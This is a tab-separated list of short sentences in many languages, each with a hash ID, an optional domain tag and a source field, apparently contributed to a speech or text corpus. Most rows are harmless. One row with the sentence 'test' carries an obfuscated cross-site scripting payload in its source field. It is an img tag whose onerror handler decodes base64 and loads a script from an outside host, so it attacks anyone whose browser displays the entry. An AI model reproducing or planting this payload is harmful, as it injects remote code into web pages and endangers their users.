sentence_id	sentence	sentence_domain	source
97ee5eb044ceebfbdc8ce3727e4a7f34ee2198294680bbe6432b7f33455ffc13	Hey! Wait! My plate is covered with mud and blood!		Grammar spellings.
97f3f5a6a0ac1c1eb722ecfaee2a61166422f57e8ba7a0b78f28cf1560acc195	طفل خود را نذر خدا کرد	general	Correction
97fd8ed79204ce10c189efa17b9cf11d3775d9846da189bff5b9d9a5572aa645	Call Adam's mobile		Self Citation
980dda5cbfb3fd1c51aca0933f91f2bd659e827a368b98141a2d2c8c707ee721	turn the lamp on, you idiot!		self citation
9824c7528288ad67a7643cb8f3facf09b35b1288e5cb41e53b128ae5e6ea7010	W'ai w'ose w'eva w'ana w'ose shighadi.	general	Myself
9834e2826b809a88da4c4988b441c3434c3683a9a08d77298175c68f1ad7a0a4	Mzaw'o w'ose ni w'achili.	general	Myself
988c6986670d2ea77da0deb732073a8d631f93d167ff7428f4f80868bcb7325f	W'eka na w'uli ghwa w'aghenyi.	general	Myself
98a9fb738de97b7763dd21d388bb0940cb5545fb269b984abb5de7e7db13958c	Brutus declares that along with his hand, he also gives “my heart too”	general	Self Citation
98d3aa2b28975690fe6cfdf8a1c8f684857200b0341aa90107f4a7df08928a40	Amamammamamama	general	12345
98e68b4a9cd9c1bcf336420fa40f57e65e52959b318de76f0306098ca119040e	Apri il rubinetto del bagno ed osservò come scorreva L acqua trasparente e pura		Paesaggio d’autunno, L.P.FUENTES
98f58687295efeb6ccc59222ca262244d29051e9f8d05f6d0dc8ed86f0095d76	Medical School for Everyone		Josberto.euvoupassar@gmail.com
991dfcdc9daa08bee26137f5081553467614ee114d646da9b28afb41bf5dc83a	I'm tired. I'm going to sleep.		Me
9953859534c3c31a7b38c018d666e741840287d67c24c90df5ccefa8279766b7	I’ve spent about thousands on pics and videos		Internet
995c49277cf8c6714b15b59ed69098a1e2d59a61d230dd9f95a13a10446f3f18	I created this sentence myself. yay		self citation
997fbd627a9d997e1fb83a139cbc021275312f322ca7285ee9a83d19bfda1c0a	Oduka mbande na gada kusekevavirika.	general	Myself
99840a6b4842a851cc21102da562b38f67db677994231d9332cf983955022446	Around the world with passport. 		Self Citation
9989bd34fa1442146bb45637c65d391b6bedaa2edbfbf7d9c9833435a3d141c0	Oh, vaata kui äge selle maja arhitektuur on!	nature_environment,general	I am the author.
998ea305d8d6c58510b3fbfd7b2f68436a8b702fe791d22db0143955b6178dee	Ika ituku jhipoie too.	general	Myself
9990900abc76683bf29dd33a2f947c88be967bd6cd3097ce1cd6ac8a24c124dd	This Program was brought you by Luxurious Organizations		Self Citation 
999b2085875e8d796c62ba333edfa6a0a583a91fc0112ff105c2d77d566583e9	W'iw'onyere basi.	general	Myself
99add6f4b93a9f8dae87e5f9cfd9f1c76021f3ae472b36441388550d12df90bb	cryptocurrency	finance	Bitcoin wallet 
99c65c34062db6116ffba53bbbf1f4d68300e43b11590a872ebf6ddeef979170	Mkaghusha mpaka omoni uende ukizighana.	general	Myself
99e58a59451cdd0a7df97865848de7927e52a493250a53efdea71bcee58f225a	ہمیں کل امتحان کے لئے تیاری کرنی ہے۔		mine
99f769ed140c3afec0c125832ba3b5f4184e11e08fd62a1024ab690abe1c6980	sign up to receive Yellowstone road alerts on your mobile phone by texting		nps.gov
99f7afe3b89c8472948218b8db381c5e5d2cf014c5c27f0f4ff8643968e2a18f	Everything they find outside of the houses they smash. 		Golden Bough
99fd96af5d072aee7fb7fd29c58b00b9de2761341cdb9c23ffee81d0487422a9	Waniredia w'uki chupa iw'i.	service_retail	Myself
9a1d83b4693e5eee13809ec8c2b124c05e1316f31e8178a9841c526e68ed63bd	Brain!		Own sentence
9a28926c4a80529a1a1cc735947010901578300e3e5cec156cc24fbacbc749d5	Kimber Super Carry Pro. 		Self Citation
9a38fceaa66c481e1318fa654fad92907f40a7048cf4fafb5693bafe582f52d1	It's a long haul so be kind to yourself		self citation
9a4af5b88553ad1c613cc45382e6e87e4110bdecba2fc89b331b4d263e36b3a1	हेलो मेरा नाम अभिषेक है।  आज मैं आपको Artificial  इंटेलिजेंस के बारे मैं बताऊंगा। 		Self Citation
9a69c41574baace672f99ed0a9420d08ec393a6a9e0cbb72abfc3b3bb000e515	My friend say he was gay.		Myself 
9a9c325d64b66a44352c980715d72325927331e6b6730f7a9f858a6e2f540d79	Kuseghorie mndungi seji uko ujha mka.	general	Myself
9a9d532bd923e390c0aa19d6e4d0c49ef51db8075fbc9e928bf1b1cd3e141360	ہمیں موسیقی پسند ہے. 		self
9aa1f09497d4671d413aabb793ddf9c755f0183556bbbb603674740f4d8cd4e6	Marashi ghaw'enuka kisaya.	general	Myself
9ab366a59535df504322fcf3c235bc194abc9024e708d5ae94cfac70907460c1	Uhu mkeku wazidilwa idime.	general	Myself
9af453bd9047406c8b92ab5aaa4ef848e02182919a72242bcd21c32d0348b829	Namneka magome ghake ukaenda.	general	Myself
9afe4061aee1b7047cedaa5f73942fe8ac4028daf10da0d153a5234b44570230	वियना के राज्य में, जहां न्याय और नैतिकता की धाराएं आपस में टकराती हैं	general	created from chat gpt
9b07fdba486fd163b86f094e90dbefc36895d2b5da4b40fd9e0d60d2bb7e429d	Hi martin		personal
9b2baf6aef5bc13aa399c53071eb6e8bf935ef45062b63632ab09df184a18079	This game is too difficult to be fun.		self citation
9b301de1df41f9cdbf4e4d77b63ce40eb3304f79a2accf987dc60e0df2d4e19c	Morning Jacob, Hi is Amelia 	general,service_retail	Self citation 
9b45879bd54897ce4b45d1bead662b666d9f45f7acb689d9819af2416a1d2ba4	 بِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ 		https://chat.openai.com/c/f49fbe24-4b85-4dea-ae3d-b3604b71a02d
9b6179c87bcf86db07710872fff432cbe38621a23a50fb29b7663e8bb5f3dc99	All I have now are sullied knives	general	Self Citation
9b6d17e08c73c877e50e8518b91606ad7c0fd34959fd25b3eaf7aca534b6ad60	test, testing, tested. fart. my butt. ow my balls 		brain
9bc27fef10e7183ae0e57fdabd45a5586056d776841fc5a8cdd587987ed378a7	get two fresh dried pasilla chilis from the Ocean Street Mexican shop		self citation
9bddca4f31f19a1a8aa8fcc7cd4f2226749aba4d041d4a8da14304020da9aedd	کوڑا کرکٹ کچرے کے ڈبے میں ڈالیں۔		Self Citation
9be44ead815d4dc1bf8f7747b41b4c8c4806acbff00373eeb1e3c3d83f9e300e	That's enough! You said, we are not friends anymore!		Grammar spellings.
9c24a3fb37a59fa0ca69ef59d2b7d5fab95957bb26cdacea6d9440a96aff7735	Waw'adwa ni kuharisha	healthcare	Myself
9c364a47e9077a83d02ff0c69985c43469ce954dfe555797245f0345619c1ad8	W'aenda hao awa w'ana w'aw'o.	general	Myself
9c448bc4dfdd0b0dc25c1f94411977bfa579621b02effb92b949b36293b00aa2	Dechanye na awo w'andu w'ako.	general	Myself
9c4d63e32c3fa610e6b8c2eac400e027a997751cb0bde739d776494fcc6d3f19	Hang on a minute, are you cheating on me? No way.		Grammar spellings.
9c4ed35e78bcac1cd50353fe91e4e91361caaaea7b82ae19bfeec983070c6d5c	Ideally natural and conversational it should be easy to read the sentence 	general	Self Citation
9c74e538b429560b5cbb3fbf8989a397ae26a6e2980b1961ffd295956b982931	Roses are red, violets are blue. I almost tripped myself.		My dream story.
9c84c22c0ab2f991c78a1f6df7fbe9a86c285e60d583f34e917d8497caf3d5cb	no tiene una infraestructura de red preexistente		https://jenkins.debian.net/userContent/debian-edu-doc/debian-edu-doc-es/debian-edu-bookworm-manual.html
9cc7cd95b71d599f75814c2c9d598501143f1dae898020de4b3610a85901dc3f	We shall consider them in the order in whic they occur. 		Golden Bough
9cc870e0465769d851240fd924ad00f177a08a159b5deae84757771cc5e1ca72	Nitesia na munyu.	general	Myself
9cce346137ffbff4e2e659d5e8addf465df6285bf1fa772caeff11b5e351e812	Balance sheet is the summary of asset and liabilities if an organisation 	finance	self citation
9cddd00f790ff55189a2018609010978310c962479d6617cb2a178d1e8bb7ce0	Ajusta el archivo		https://jenkins.debian.net/userContent/debian-edu-doc/debian-edu-doc-es/debian-edu-bookworm-manual.html
9cde980f3109e9f84aca0bfe8983f0eedbf33df65eee188b937ebe43da73a596	Wadanyeghelwa ni madu.	general	Myself
9ce26570f4b1c47e04da3bbb6d3fc7a87231cca02840c88b57cf1c6022941465	Maka ghajhoka bei kweli.	general	Myself
9ce6a736260f94a070da082ca2f14c1204cd9bb2bc59ae3c111a09712e15e15f	You selling my stuff? No, I want to get that one, so rude, huh!		Grammar spellings.
9ce81576b0733c273c14daab3120cf2c986a171fbc34a1cd30e3ef47d634457d	There is thirty four minutes left on the timer.		https://www.google.com/search?q=google&sca_esv=2b87a7951bc7ea46&sca_upv=1&rlz=1C5CHFA_enUS1055US1055&ei=Q6b9ZbC1PJCgiLMP4LmFgAU&ved=0ahUKEwjw4ouSmoiFAxUQEGIAHeBcAVAQ4dUDCBA&uact=5&oq=google&gs_lp=Egxnd3Mtd2l6LXNlcnAiBmdvb2dsZTIMEAAYgAQYigUYQxgKMhEQLhiABBixAxiDARjHARjRAzILEAAYgAQYsQMYgwEyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyChAAGIAEGIoFGENIjQZQ4ANY4ANwAngBkAEAmAFEoAFEqgEBMbgBA8gBAPgBAZgCA6ACVcICChAAGEcY1gQYsAPCAg0QABiABBiKBRhDGLADmAMA4gMFEgExIECIBgGQBgqSBwEzoAfaBw&sclient=gws-wiz-serp&safe=active&ssui=on
9cf0494351db1996315e2590738e8c1d345b75db105cd9e3a0df7bc71657db3d	ჰოლმსთან მხოლოდ მე და ინსპექტორი დავრჩით.		არტურ კონან დოილი “მოცეკვავე კაცუნები”.
9d35409ebe6c8eb7988628c56e1a8b38cb2949d98de464f25e160f5bcf124b13	Wadadeka vindo ve w'ikata w'eni w'ieka.	general	Myself
9d41191a73bd31a2b8c01852668f9cdd4f3d9656773d75f306ef3414e65ad9bd	Maka ghapo ghose ghaiw'ilwa.	general	Myself
9d9e4d49d7faf04b344b589960e9fb100755737d1a9f0c028c42cac2e7f45d84	Ukajha wadalala tayari.	general	Myself
9dda29cdc345cf8ba6edb3b86236d44c3ab76a8ec3dff57206bb2f981abb7891	He has terrible eyesights, and needs glasses. 		https://www.google.com/search?q=google&sca_esv=2b87a7951bc7ea46&sca_upv=1&rlz=1C5CHFA_enUS1055US1055&ei=Q6b9ZbC1PJCgiLMP4LmFgAU&ved=0ahUKEwjw4ouSmoiFAxUQEGIAHeBcAVAQ4dUDCBA&uact=5&oq=google&gs_lp=Egxnd3Mtd2l6LXNlcnAiBmdvb2dsZTIMEAAYgAQYigUYQxgKMhEQLhiABBixAxiDARjHARjRAzILEAAYgAQYsQMYgwEyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyChAAGIAEGIoFGENIjQZQ4ANY4ANwAngBkAEAmAFEoAFEqgEBMbgBA8gBAPgBAZgCA6ACVcICChAAGEcY1gQYsAPCAg0QABiABBiKBRhDGLADmAMA4gMFEgExIECIBgGQBgqSBwEzoAfaBw&sclient=gws-wiz-serp&safe=active&ssui=on
9df3e32ceb826566e8cf2f8efaf60d64553f1a2e22e52e67f541c986f96f1077	سڵاو هاوڕێیان من تەنها مانگێک لە فەیسبووک وازی هێنا 		?
9dfe762928fed99b900e0c4326a1f20cade22aae434c1e828f955a54228bf788	તમે કેમ છો?		Self Citation
9e35fa13e29f81ba6ec7448857e80293a5a250bda608f3b160e46ca27e04550c	Madu yake yekorwa yose.	general	Myself
9e5155119b03dc1286761a00e704bd5d8c64ff890dbde85074cff46ee2601810	Bora ndew'ikabana shida ingi ndeiko.	general	Myself
9e649bb811f52de4eccae1b1dd2123b3c90e7db8c1f493bb7a8867a73fdfe3cf	اپنی طاقتوں کو استعمال کر کے کام کریں اور مقصد تک پہنچیں۔ 		self
9e722271d568a4c14f4de1291923a05685a6e6b0b0b3854e58eef017b55b08f9	ვახტანგ გორგასალი დედოფალი არ იყო მგონი.		ონუზი
9ea1f06c7cb8fa3db3b912e35b77ad9dd7963dffc876aaad97c707cfec9df5c2	Zighana malagho kwaw'eenda kukighoria w'andu.	general	Myself
9eacf6aa23a90d3c163254b2375884c716739aadf330834a42a63e7aa4907ff1	Walegha icho kifu si chake chingi.	general	Myself
9eb6669616fea67d116fe090e77662953ad66ce714d57d313d99dc1547cfe24d	Kusesow'e kukotia makoto.		Myself
9ed2eba5539fb8dac9ef5198b37742edf622eb94e681a74722c8c2a74bf848f7	Wedeniredia vindo.	general	Myself
9ed9d2d09e87882c048ad542374755b1b84046d64e5494f0f04749537938481e	Idimee daw'eenda w'itesia kukota choro.	general	Myself
9f11ae4ada1b1dc787c2809e9318a10175e192ddb5fadf9b43bb4ecda0730d71	टूटी हुई क्रेयन  		chat
9f33c3042f05d3f26ce7bfa2d911635e767e8831a08b6bb2f1710f34653837d3	When Sarah finally stopped tickling Jenny's feet she just lay there breathing heavily.		Self Citation
9f5297c58385d148e108fd495e6846ce04389ddae5675def08eb5bf616c7bf7c	صدقہ دینے کی اہمیت کو سمجھیں اور دعائیں کریں۔ 		self
9f56bf3d15b54dcfbc66e91112244d2aa534db47e765c1b54a6a2be36d600ef4	გონიერი კაცი არასდროს არ ჩქარობს		ვეფხისტყაოსანი
9f7714192711248bee7676e9c3e5b8d34b7586d8a70ee9a6eb1f48773dc95cb9	Teste de linguagem 		Portuguese
9f83b5587d68407b8eb1962e2b786d801d365fdff0bfb14ee12bcc60ff5170aa	Jhingi ndew'itala w'aghenyi vindo.	service_retail	Myself
9f9c279a51514fff2b0c1d7713d0deb86022540320a0bda62d5566346c579ffb	تمہیں پتا ہے؟ 		Self Citation
9fbca1d2d3d0914b8acb7433ffc94e56c34b31df9eaa1ea1334cb251668a9a92	monetary policymaking requires a forward-looking approach	finance	federal reserve
9fe206c8fc945a25cd2b1ffced3ef201632b4dadab86d1bd74fb0f3b46ae71b4	I'm sorry, I have to end up the wedding. New school for me.		my beautiful speech.
9fecf321c924218960de26cb324ed2dcd15aaf9010256c4044f30d6703fd4931	ناروغان کوښښ وکړي، چې ډېر مايعات و څښي	healthcare	فیسبوک
9feeb28bfccc6001ff50b650ad98d4e40044c40b74af6fa3281f8f2d3515f73c	یک بازی برنامه‌نویسی با ربات‌های کوچک		self citation
9ff51d4a35c7032f021d7bb5f137ed62c71c2990fceffe4e945d722830604585	Nugget		Self
a01d2aa5ca2337665889fe224d175911c37f0a35f4f4146f5f50a5480433f35b	. دوسروں کی ترسیل کو سمجھنے کی کوشش کریں۔ 		self
a0275dd28bcd3f736fb10d4232f86c08e57a4ef9d96681407a16cf40a30fa0ff	Wadaseka kila saa.	general	Myself
a03eb46c73bab62f989c841e088f6ee2d663ce42a48206834a6868ba4fdc00c6	Walemwa ni kuw'esera putu.	general	Myself
a05de3f24ab94ae7f54aa3baa35f41b5a0d1dd5d25f72076155383b9a0a35834	test sada asd	automotive_transport	sasda
a068ecce9e061687e1ae1d2ccf5366aa65e73540be0d87bac1db31f2ec24fce8	Vindo vasinga vikachumba.	service_retail	Myself
a06e9e70f18428a6b5c91a011a131394c9a3eb9bdccd43d374fb7a8fb37770e4	. محنت کریں اور مقصد تک پہنچیں۔ 		self
a07a6a08dba000fd63c466877773289eeb3ccfd6eeba496c6c0ba585adf8316f	Wakijiji daw'isera ndedikunde w'uchafu aw'o.	general	Myself
a0b0f967fcc6e588c77d9e81cee7e005b84f3eafd9f70494cc58fa82f4047353	ہم پرورشِ لوح و قلم کرتے رہیں گے		Self Citation
a0d8281d9aebd4409f62ed835c2a582a4015dc9859c9878f2bec9bf68fab5b98	Oh shoot, my cupcake! My client so angry at me. 		Grammar spellings.
a0f2c1393e1aa31afb8d344c55a9bff6f56285cccbffd97cb79bd47764c4626b	Wadakita w'andu w'oruw'o.	general	Myself
a118851012deb03f25e1f802f55e3a3081450dd4d36e4038bb1c96fca2dc1a64	Namdungua ukazamilwa.	general	Myself
a1274ebab7eac25d563496b6640a1b090ffa04bfa236e52d043dc94665474ca3	Anya Rajput	general	Self Citation
a1314ab6d0ebbb78b3c16659a6116021fcf37a61e622432a9ad7a53346e38be0	It startles me so bad every time i walk by.		Self citation
a1330454226bb5278ffaa17219f1838d4a8e77a334cf342af20d1170d5124b29	Cor mundum crea in me, Deus, et spiritum rectum innova in visceribus meis.	general	https://gregorien.info/chant/id/1542/9/de
a151f5bc39d33b3278dd72b1d0463e291907f3f26b7709fe42663046ab68b895	I keep Five Million potatoes in my pocket!		Self Citation
a15675a6bd8ef599e920fbbda6d658da71845f430821ef4a1206e6df83a8e70a	The Material Plane is the nexus		System Reference Document 5.1 Creative Commons
a1837a8c0850b53099647795531d09d3b1e3a7fc2b5cf732c959e92df4b7243f	i am testing this		self citation
a18b224caa22663db6d5bf890703bb0ead753a9b4828b22dd404c96253a12bc7	Mdeke vindo vikate.	general	Myself
a1aed13e9269a64faf344bf975331ac0777e554841f8cd4ad2de166810603317	Wofuma maghegho aw'i ghieka.	general	Myself
a1b737421673d1394ed86291047c9beed7eda573a173a475e3b7075c8d19b745	I am a living legend o yea 		SELF
a1be9cd4388443e908fbd5fb31e89b74c6fc65bba6107d31ae902c36882eb994	E cosa ci fa da queste parti, tenente?		Paesaggio d’autunno, LEONARDO PADURA FUENTES
a1c6dce9106de6f24a1f664b2e71f053c8df2fd177aee93c046cf32773e8e578	W'aw'ew'a na mbolea pacha.	general	Myself
a1d345298cc3fdd1d0d65edc80c4443989013f695ddd837fc7a777ab6f6af046	A military saddle braces the rider, helping you keep your seat		System Reference Document 5.1 Creative Commons
a1d34800d7781ce3c95f628665bee671b880e0ea71f529ca561f74bd49cf2c36	Ouch, I hurt my hand by accident, when I'm opening.		Grammar spellings.
a1db0d7e95974674ec759e11ee4463dc8043c9e415566f7f2a8c96b01c716459	Kaw'ona nimlow'uaa usighe mwana.	general	Myself
a1e4094a43547fbd88c04a1f4b1766f5231c0894cc066cd16385ac9d203b398f	Hope you're not too bored of the other sentences on this website		self citation
a1ea752a59b194feb3b5d072cb9525af97ed01d2a879b343ebf9a0b094b1dda7	Life for today for tomorrow never promised.		oneic
a1fcedd5c36e3a31e006a8917be62ccfa864a93ca4d1dd6dccd93a5e832d08db	Zighana w'andu w'aw'ekuneka wushauri nicha.	general	Myself
a2194d56158eaff664881ad5bf4327087024b1b568f8035b1b60f36006412e48	پخېر راغلې	general	Self voice
a21e3ce2f2151f74af1329f8beb9a95c3e2c014b1c3217eb1a0c01b2b1a9e7a8	 میں پاکستان سے ہوں۔		Self Citation
a220267c10554110724aea18af6ec7939cd7cbb7e185d9ba81a3b653c22130d0	Kifumbi chapo chachika.	general	Myself
a233c590638ab2cb5a4eb47237d00793336b8fc30a94f788db4aae490b222ba4	Choro chaw'o chechua.	general	Myself
a238a5065a09dff82d625b21c4a55303581e192ad3e4b0e822f960b79ff303ef	It is raining cats and dogs  	general	me?
a23a6c4307e47bf0149a77b96b22cb731071cc639626bf93d6126927dc2192b7	W'andu w'alemwa ni kughuda.	service_retail	Myself
a2413194d6f415ab06b2d59be5e6b6d18abc45aea8e3a2b7c9e2fe52327690e3	Nedemguya kila kilambo cha mzinyi.	general	Myself
a2960db92b2d39663fb399ac0993aea7e07e38164ad0ea95e6a6f3e05658ccd3	اچھے پڑوسی اللہ کی نعمت ہوتے ھے ـ 		Self Citation
a2b8f10a3ac8eccf41f5f3a4d0f13c9a1b63cab212637f90bc7a27f57ed22760	Today is a hot sunny day in Abuja with domain	nature_environment,general	self
a2f662be8591eed478e7c5804e71a414f9a5f471ea8672f69ed1fa37d18ddd6f	¿A que hora sales de trabajar?		Self Citation
a3240b8b2a0e19ce1bb4d76b8e44cd7a7eb33cc745a17349bd7bb2fea41ff0f2	peak danger was really a little earlier, last week was dry shirt-sleeve weather		self citation
a3256244150713b9854b9d0222ac7ae430953faf37d9b5e6e0c8b1e7f49931d8	Thereafter, until the creature breaks free of the trap, its movement is limited		System Reference Document 5.1 Creative Commons
a3260025b7bd9af7a1bfd30eeb9867a11a74284240b839b13171a5ca45db896f	Mbogha radanisingua.	service_retail	Myself
a38e351688dc42588e9676f0f16b24b79ecdf7d55aba99ff9aeb90db1d810fcb	Hey there this is large language model		Myself
a391df47fc862aace4382ed4a69e7c6730f290c5f3ab8847c9bcd0eee5e103bd	Dasow'a magome ghe reda mumbi ghwake.	general	Myself
a3946229cf4af97e7e7bdb3afd743f2bc93cc5ef94414fe83cfacee9a2665f1a	. صحتیابی کی قدر کریں اور صحت کی دیکھ بھال کریں۔ 		self
a3c5ebc30aeb4082263500bb834985340c92676924e1f3dd5fb3a76fb5cc3ef6	It was a wonderful week, thank you for that, I so enjoyed your company		self citation
a3cffd7b8699d5c22f3a3ed2cc1eac78fe1a77d765a9791ba7b6b33713e0f15d	test message		test message
a42289999aa3e3bfe9eecea8729f91b83ed496ebae6a15f9565053c5e239d2a1	. اپنی تعلیم اور دانائی کی قدر کریں۔ 		self
a456539f0251139e2f3c8d10c5d2fcdaecb1e8f6355bd8886e1729c130fd78aa	اور بھلا درد کون سہتا ہے ـ		Self Citation
a464e7de86f07739904cb185f4f54689671a35ee7b69b429cf8ec5f000b8c156	شەو و ڕۆژ بووین بە گرفت		شەو و ڕۆژ بووین بە گرفت
a4f5f28e480cf6148418eda4f2648ee6d7ec28741aa2adad56079255d1bb7bf4	Hey, watch yourself. If you blame someone, do not hate.		positive and kind words
a4fd5ccac7e19cd4708ff9d8e1659c1652d9e215e63e4cccac7e8e6a811fe8da	وہ روزانہ ورزش کرتا ہے. 		self
a50064404a4a9aea4898ed7ba1cb8665e4c03c02262484f0b07bb38446195a79	Ndedimanyaa ngera uredwa lii.	general	Myself
a542335d638e46a07b853228c56af4acaaf8a97cb2869daf26737b6df1f68250	Wadasikiria w'andu w'ikakadeda.	general	Myself
a5540ea256f37f73e0659fdc9b7ce7158cbec562b70bf6dcd94a8f7d39c729c2	Ukaogha wadajishinga mavuda.	general	Myself
a55fd4133a75315b1395f38ef5aed46a4044adc931bb1740927528174b2d4090	Befragen Sie doch ihre Ernährungsberaterin.		eigener Satz
a56f1e0e03b060faed4363512884ac4d5a8baaa2ac7f56e8995234c061ba3b34	Mka wa kaw'i womlegha.	general	Myself
a57efa316d94fe520ee061c534c4fb4edbf80068935b42d0bba05d050698ebf3	Genesis Arellano	general	Self Citation
a5927d313f9946b2f2dd757a295266218707b096dde80d43fc323e3a8afa7706	La luz iluminaba lo suficiente como para ver que había alguien ahí.	general	Cita personal
a5aa9b61cf50c84cc70294e26bcde17d508ea2517c317014a7177862a4c6f9b8	Belei chichin suswek.	general	Self Citation
a5af1b09ecf9e0a187a29442c5bacef209d640f260075231f822f227acdf595d	Wadasinda ukiasama w'oruw'o.	general	Myself
a5ca88609e5c6665b218c80307347d580b5038d5c9e0cff5c1309e63812880a6	test		"""><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzBuY2prd2R5cmEiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>"
a5fd7c67266fa8bb7f5a8ead68e4118f8ee0a1f876ad2573cdd492ea6fade357	Ujha mwana wovalwa na maghegho ghose.	general	Myself
a609f3abb555d8ac9d27a409dd9eb32ca9d7f24b3829d1c48df2b09084010abe	. محنت کا پھل ہمیشہ میثاق پورا کرتا ہے۔   		self
a61b532bd933c6d70420987983e842eae0a89327428c8526a3421c295d072d71	ہمیں کل ایک تقریب میں جانا ہے۔		mine
a64108a1277e951639cd2c49e04a5e58b87b6560b2a2fbcadc189fd073fdc3fd	they are undertaking a legendary journey across the thresholds of existence		System Reference Document 5.1 Creative Commons
a66b067c94e7632c0e35bd8e91876b385c92eeaece1993185a6bf000faa4a039	Kwani waendie ukaw'uya.	service_retail	Myself
a68f20889b425843f2237bec2954009849671f2cd3d23032e71eba098392182c	Almost nothing is know about Duran except that he was a Spanish monk. 		Golden Bough
a69479eed9a93d6f0bbcbe8e535f245c3ee3d1d9ec0ade3248f8161edceeadae	I replied that i'd consult you and tell her soon		self citation
a6bbce35f6d0a8352cbaa5998ea45dc87c21f5c322c852429587e8f58dc213ba	معاف کیجئیے گا۔		Self Citation
a6c07cf11614e1aabff4bc84761605d464644ac40f3f849dd3989f1104d0c301	میں کل دوپہر کو کھیلنے گیا۔		mine
a6d9a658640e436abd4282183ddcf14d414887d4532d48aab43fb6ca94c287f0	کیا آپ کو موسیقی پسند ہے؟		mine
a6e0b80352b561ab3903290a59aff709ddea31ceb7adb9f25f9c2a8c805f7f46	Beyond that plane are domains of raw elemental matter and energy		System Reference Document 5.1 Creative Commons
a6fdb6559bc0c89fbc1bef51aba3a97c30bd61ae2e22548f78178b870bc14247	Kikala chimu chizamie nisikire ni w'ei mwana ukavalwa ingila wafunywa kizongona.		self
a737fb2666bcbd39809b838de475125cd9605986f5538919835263b010882093	W'andu wa mzaw'o w'emlegha.	general	Myself
a75354f3053c2d66a55a9d8308c3aeb7e557d078dfa639413d1e1a79cb2158a8	Ni kichuku Charo.	general	Myself
a7857fcbf5512568dc5d30aad779e08f6cb58067a02296f71e1a6bda64da66a8	W'uloli ghodemw'aw'a.	general	Myself
a79bdfb3bfab0bb00ae89eadfd14073519034df9b9b12ff8d37f34e797d42315	Are ye a human being and not a cabbage or something?		https://www.cs.cmu.edu/~tilt/principia/body.html
a79f6f12bb3c38120f2b4495f01ee4314aae64c3f94cea1798a51e0510132768	Wodeenda dedia kula eri niseskire.	general	Myself
a7a28038bffef03da1ac14f5d55fa31ec74fdaa34a4898bf721b3f8343409b70	Ndew'iendaa kwa mundungi w'aleghwa.	general	Myself
a7a72868245a192dbf0595b4e4178280406fb04c2d2f08df4186549788e95e0b	Kukadumbua kighogho kuw'e chimu.	nature_environment	Myself
a7ab42830c671ec7e28c27c36e2ebe65cd0c423d8e0aa96182b2ef73656d40bd	Mr. A. B. Cook was the first to call attention to these vase-paintings.		The Golden Bough
a7af183ccd578994a6e68a4a8abb25680462477173751abeea9806044a7c5583	Kedi wazamilwa ukashoa vilambo vose.	general	Myself
a7bcf2d1c36b089ea12bc3385b0a681aaeaa26fdb0d1be0675cc6cd97b3d3947	you are your characters, for people know them more than you.		self citation
a7c417f9f92e49a320173ba68f5c66b402e0d9fe078a2d9780e20ce6a83e6e75	Mwaw'onane kafwani loli? 	general	Myself
a7c7596af4f29a138b5be8b96adfa582a09e8bd5a6d9ce33ebaa6cd32a30257d	Good morning flora		My sentence
a7cd3cfe9020eeb9d2688389fcfdff393831fba469ec01cbe0e0f3c3bf310971	genghis?		my mind
a7fbc851bd254d8e27914af1133f14834f65a7e2b11e070f754718bd0d210735	ᱤᱧ ᱵᱟᱰᱟᱭᱟᱧ		ᱤᱧ ᱵᱟᱰᱟᱭᱟᱧ
a7ff8b862e3b62dd634913f21202ab4701c82de93d9a713140ca0338f15a2146	instalar un sistema para uso de producción		https://jenkins.debian.net/userContent/debian-edu-doc/debian-edu-doc-es/debian-edu-bookworm-manual.html
a8579480c4bada1fdc11aeb8ef36be8a667714eef681366b4639fdd73df26a03	hello guys		as
a8be6022b5787e07d49a8fe9e6f2d63d85520793958d87cdb295723fd4abbca1	Mu telefoniaku saab viimasel ajal päris ruttu tühjaks.	general	I am the author.
a8c083bbd8a6f47f75ebc7816379517a200ac6687a3f35acdb74cd1cf5e1a4b5	Zighana mwana usekejha makaratasi.	general	Myself
